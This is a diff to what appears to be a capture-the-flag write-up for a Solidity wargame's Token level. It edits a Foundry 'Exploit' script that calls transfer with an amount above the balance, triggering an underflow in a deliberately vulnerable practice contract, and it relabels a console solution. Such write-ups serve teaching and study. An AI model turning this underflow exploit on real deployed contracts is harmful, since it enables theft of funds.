@@ -100,19 +100,16 @@ function transfer(address _to, uint _value) public returns (bool) {
 <br>
 
 ```solidity
-pragma solidity ^0.6.0;
-
-import "forge-std/Script.sol";
-import {Token} from "src/05/Token.sol";
-
 contract Exploit is Script {
 
+        Token level = Token(instance); 
         address instance = vm.envAddress("INSTANCE_LEVEL5");
-        Token level = Token(levelInstance);        
+        uint256 hacker = vm.envUint("PRIVATE_KEY");   
+        address deployer = vm.rememberKey(hacker);         
         
         function run() external {
 
-            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+            vm.startBroadcast(deployer);
             level.transfer(address(0), 21);
             vm.stopBroadcast();
     }
@@ -133,7 +130,7 @@ contract Exploit is Script {
 
 ---
 
-### 3-lines solution directly in the console
+### alternative 3-lines solution directly in the console
 
 <br>
 
